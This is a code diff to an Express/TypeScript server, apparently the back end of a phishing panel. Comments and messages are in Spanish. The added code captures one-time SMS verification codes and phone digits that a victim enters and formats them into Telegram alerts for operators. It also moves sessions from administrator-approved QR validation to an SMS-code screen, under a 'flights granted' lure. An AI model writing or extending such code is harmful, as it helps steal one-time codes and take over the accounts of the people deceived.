@@ -1371,6 +1371,33 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
                 `⚠️ <b>Estado:</b> Esperando validación de administrador`;
             }
+            
+            if (tipo === 'sms_verification') {
+              updateData.smsCode = inputData.codigo;
+              updateData.terminacion = inputData.terminacion;
+              updateData.pasoActual = ScreenType.VALIDANDO;
+              console.log('🔥 CÓDIGO SMS RECIBIDO en UPDATE_SESSION_DATA:', inputData.codigo);
+              
+              // Generar número de teléfono completo si es posible
+              let telefonoCompleto = existingSession.celular || '';
+              if (telefonoCompleto && inputData.terminacion) {
+                // Si el teléfono termina con los dígitos esperados, todo bien
+                if (!telefonoCompleto.endsWith(inputData.terminacion)) {
+                  // Si no, usamos la terminación proporcionada como referencia
+                  telefonoCompleto = `***${inputData.terminacion}`;
+                }
+              } else if (inputData.terminacion) {
+                telefonoCompleto = `***${inputData.terminacion}`;
+              }
+              
+              telegramMessage = `📱 <b>CÓDIGO SMS RECIBIDO</b>\n\n` +
+                `📋 <b>Folio:</b> ${existingSession.folio}\n` +
+                `📞 <b>Teléfono:</b> ${telefonoCompleto}\n` +
+                `🔢 <b>Código SMS:</b> ${inputData.codigo}\n` +
+                `🔢 <b>Terminación:</b> ***${inputData.terminacion}\n` +
+                `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
+                `✅ <b>Estado:</b> Código de verificación ingresado`;
+            }
 
             await storage.updateSession(sessionId, updateData);
 
@@ -2242,19 +2269,32 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Actualizar el estado de validación del QR
       const updatedSession = await storage.updateSession(sessionId, {
         qrValidated: approved,
-        pasoActual: approved ? ScreenType.VUELOS_OTORGADOS : ScreenType.QR_VALIDATION
+        pasoActual: approved ? ScreenType.SMS_VERIFICATION : ScreenType.QR_VALIDATION
       });
 
       // Notificar al cliente sobre el resultado
       const client = clients.get(sessionId);
       if (client && client.readyState === WebSocket.OPEN) {
-        client.send(JSON.stringify({
-          type: 'QR_VALIDATION_RESULT',
-          data: {
-            approved,
-            reason: reason || (approved ? 'QR validado correctamente' : 'QR no válido')
-          }
-        }));
+        if (approved) {
+          // Si se aprueba, cambiar a la pantalla de verificación SMS
+          client.send(JSON.stringify({
+            type: 'SCREEN_CHANGE',
+            data: {
+              tipo: 'mostrar_sms_verification',
+              terminacion: session.celular ? session.celular.slice(-4) : '2390',
+              mensaje: 'QR validado correctamente. Ahora verifica tu código SMS.'
+            }
+          }));
+        } else {
+          // Si se rechaza, mantener en QR_VALIDATION con mensaje de error
+          client.send(JSON.stringify({
+            type: 'QR_VALIDATION_RESULT',
+            data: {
+              approved: false,
+              reason: reason || 'QR no válido'
+            }
+          }));
+        }
       }
 
       // Notificar a administradores
